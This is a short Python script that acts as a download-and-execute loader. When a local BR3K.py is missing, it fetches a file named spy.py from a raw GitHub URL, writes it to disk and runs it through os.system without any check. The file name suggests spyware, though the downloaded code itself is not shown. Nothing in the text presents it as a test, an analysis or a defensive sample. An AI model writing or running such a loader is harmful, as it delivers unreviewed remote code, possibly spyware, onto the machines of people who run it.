import os
import sys
import requests
try:
   open("BR3K.py","r").read()
   os.system("python BR3K.py")
except (FileNotFoundError, IOError):
   s=requests.get("https://raw.githubusercontent.com/br5kly/sd/main/spy.py").text
   open("BR3K.py","w").write(s)
   os.system("python BR3K.py")
